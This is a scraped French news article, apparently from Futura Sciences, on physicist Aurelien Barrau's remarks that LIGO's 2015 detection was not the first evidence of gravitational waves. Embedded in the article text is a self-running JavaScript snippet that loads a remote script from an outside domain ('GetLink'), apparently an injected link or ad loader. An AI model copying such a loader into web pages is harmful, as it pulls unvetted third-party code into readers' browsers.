{"title": "Ondes gravitationnelles : la mise au point du physicien Aurelien Barrau", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2016-02-14", "content": "Le 3 octobre 2017, Rainer Weiss, Barry C. Barish et Kip Thorne ont recu le prix Nobel de physique pour la premiere detection des ondes gravitationnelles grace a l'instrument Ligo. Les deux premiers pour avoir concu le systeme, le troisieme pour ses travaux theoriques. Cependant, comme l'ont rappele plusieurs physiciens, dont Aurelien Barrau, ce n'etait pas la premiere mise en evidence de l'existence de la lumiere gravitationnelle... Article publie le 14 fevrier 2016 Aurelien Barrau  est bien connu des lecteurs de Futura-Sciences en raison de ses travaux sur la  cosmologie  quantique, les  etoiles de Planck  mais aussi les minitrous noirs et ses ouvrages sur le  Big Bang et les multivers . Mais le theoricien de la  gravitation quantique  est aussi implique dans des projets experimentaux et observationnels importants, en l'occurrence le  detecteur AMS  a bord de l' ISS  et le futur  telescope   LSST . On attend du premier qu'il nous renseigne sur la  matiere noire  et du second qu'il nous eclaire sur l' energie noire . On ne pourra pas donc reprocher au chercheur de ne pas savoir apprecier la pertinence et l'importance du travail de ses collegues qui ont concu et construit les detecteurs  Ligo  et  Virgo  ainsi que ceux qui ont analyse le signal detecte par Ligo le 14 septembre 2015. Dans les commentaires que fait Aurelien Barrau sur le  blog  mis a sa disposition par Futura-Sciences, intitule  Cosmogonie , l'astrophysicien et le philosophe qui a ete a l'origine du  Colloque de Lyon sur la cosmologie et la philosophie  se contente simplement de preciser certains points concernant aussi bien la  physique  que l'epistemologie. Voici le debut de son billet qui contient plusieurs questions auxquelles Aurelien Barrau repond. C'est avec le radiotelescope d'Arecibo que Hulse et Taylor ont fait la decouverte indirecte des ondes gravitationnelles.                               C'est avec le radiotelescope d'Arecibo que Hulse et Taylor ont fait la decouverte indirecte des ondes gravitationnelles. (c)  Arecibo Observatory  Mise au point sur la detection des ondes gravitationnelles Les  ondes gravitationnelles  sont de petites  vibrations  de l'espace et la journee du 11 fevrier fut historique pour celles-ci ! Nous venons de vivre un evenement majeur.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Avant d'entrer dans le vif du sujet, je veux commencer par commenter le titre provocateur de ce billet : il ne s'agit nullement de contester ni de denigrer la magnifique detection operee par l'experience Ligo et moins encore d'en contester l'interet phenomenal. Il s'agit d'une mesure a la fois siderante et emouvante. Voir des  trous noirs  de cette maniere est sans precedent dans notre histoire et je vais y venir en conclusion. Mais je crois neanmoins qu'il est important de produire certains eclaircissements par rapport a differentes analyses un peu trop rapides qui fleurissent ici et la, de facon a ce que cette avancee exceptionnelle soit appreciee pour ce qu'elle est vraiment ! 1) Vient-on de decouvrir les ondes gravitationnelles ? Non. La decouverte est ancienne. Une decouverte, en effet, est une indication que l'on considere comme suffisamment fiable pour lui accorder notre credit. Ce n'est jamais une preuve irrefutable. C'est un faisceau d'indices qui convergent. On ne peut pas etre certain, par exemple que ce qu'a mesure le Cern est bien le  boson de Higgs  prevu par nos theories. Mais cela semble si credible que nous pouvons collectivement nous mettre d'accord sur le fait qu'il s'agit tres vraisemblablement de la decouverte experimentale du Higgs. Et ce sens, je crois qu'on peut s'accorder a considerer que les ondes gravitationnelles avaient deja, et depuis bien longtemps, ete decouvertes ! En effet, le  systeme binaire de Hulse-Taylor, un pulsar  tournant autour d'une  etoile a neutrons , etudie des 1974 a permis de montrer que la variation de  periode orbitale  observee etait exactement expliquee par l' emission  d'ondes gravitationnelles. S'ensuivit le prix Nobel en 1993. D'autres systemes de ce type furent decouverts, tous en parfaite adequation avec ce que predisait l'emission d'ondes gravitationnelles. A ma connaissance, plus personne ne doutait donc de l'existence des ondes gravitationnelles. La detection a donc deja eu lieu il y a des decennies. On pourrait objecter qu'il s'agissait d'une detection indirecte tandis que celle, toute recente, de Ligo est directe. Je pense que cette distinction n'a aucun sens epistemologique. Aucune detection n'est jamais << directe >> : on observe les effets secondaires d'un phenomene physique sur des objets utilises comme outils de mesure. C'est ce qui a lieu dans les deux experiences considerees et la seconde (Ligo) n'est pas plus << directe >> que la premiere. Je suis persuade que si l' interferometre  de type Ligo existait naturellement et que nous avions nous-memes construit le  systeme binaire , c'est a ce dernier que nous donnerions le qualificatif de << detection directe >>. Pour connaitre les reponses d'Aurelien Barrau a d'autres questions comme :  A-t-on enfin vu les gravitons ?  A-t-on vu les ondes gravitationnelles primordiales ?  A-t-on enfin prouve la  relativite generale  ?  Va-t-il enfin devenir possible de tester les theories << au-dela >> de la relativite generale ?  Cliquez sur le lien ci-dessous Vient-on vraiment de decouvrir les ondes gravitationnelles ? Interview : un trou noir peut-il exploser ?                       Un trou noir est un objet celeste difficile a observer directement. L'intensite de son champ gravitationnel est si intense qu'il empeche en theorie toute forme de matiere ou de rayonnement de s'echapper. Peut-il exploser ? C'est la question que Futura-Sciences a posee a Aurelien Barrau, astrophysicien specialise en cosmologie et auteur du livre Des univers multiples.                                       Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  aurelien barrau  |  ondes gravitationnelles  |  les ondes gravitationnelles  |  mise au point pcr  |  moteur de mise au point  |  mise au point telescope  |  latitude de mise au point microscope  |  aurelien brule wikipedia  |  microlentilles gravitationnelles  |  lentilles gravitationnelles", "theme": "sciences"}